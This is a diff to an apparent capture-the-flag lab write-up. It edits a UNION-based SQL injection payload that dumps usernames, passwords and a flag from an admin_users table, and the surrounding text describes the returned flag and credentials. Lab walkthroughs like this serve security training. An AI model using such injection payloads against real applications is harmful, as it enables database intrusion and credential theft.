@@ -103,7 +103,7 @@ SQL errors are displayed in the browser. The `reports` table has 5 columns.
 
 **Exploit** — dump `admin_users` table:
 ```
-' UNION SELECT 1,username,password,flag,5 FROM admin_users--
+' UNION SELECT 1,username,flag,password,5 FROM admin_users--
 ```
 
 Returns: `FLAG{synapse_sqli_creds_dumped}` — **FLAG #1** plus credentials in the flag column.
